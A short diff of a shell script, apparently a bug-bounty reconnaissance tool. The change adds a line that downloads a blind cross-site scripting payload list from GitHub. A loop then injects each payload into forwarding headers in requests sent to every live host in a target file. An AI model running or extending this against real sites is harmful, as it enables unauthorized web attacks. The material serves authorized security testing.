@@ -38,7 +38,7 @@ wc -l < $1LIVE.txt
 sleep 1
 
 #blindxss
-
+curl -LO https://raw.githubusercontent.com/husseinphp/blindxss/main/bxss-payload.txt
 while read bxss;
 do  httpx -l $1LIVE.txt  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss" 
 sleep 1
